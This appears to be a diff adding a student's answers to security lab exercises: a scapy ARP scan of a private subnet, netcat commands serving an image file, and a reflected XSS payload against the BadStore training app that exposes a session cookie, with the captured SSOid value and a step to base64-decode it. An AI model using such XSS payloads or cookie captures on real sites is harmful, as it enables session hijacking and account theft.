@@ -1,0 +1,22 @@
+15a)
+import scapy.all as scapy
+request = scapy.ARP()
+request.pdst = "192.168.5.0/24"
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+request_broadcast = broadcast / request
+clients = scapy.srp(request_broadcast, timeout=1)[0]
+for element in clients:
+    print(element[1].psrc + " - " + element[1].hwsrc)
+
+15b)
+- nc -l -p 8080 < image.jpg
+- (printf "HTTP/1.1 200 OK\r\nContent-Type: image/png\r\n\r\n"; cat ~/Desktop/cat.png) | nc -l 8080
+
+15c)
+For SSOid - 
+- Inspect -> Storage -> Cookies
+- URL : http://192.168.56.101/cgi-bin/badstore.cgi?searchquery=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E+&action=search&x=0&y=0
+- Answer : SSOid=am9lQHN1cHBsaWVyLmNvbTo2MjA3MmQ5NWFjYjU4OGM3ZWU5ZDZmYTBjNmM4NTE1NTpKb2UgU3Vw%0AcGxpZXI6Uw%3D%3D%0A
+- base64 decode
+- <script>alert(document.cookie);</script>
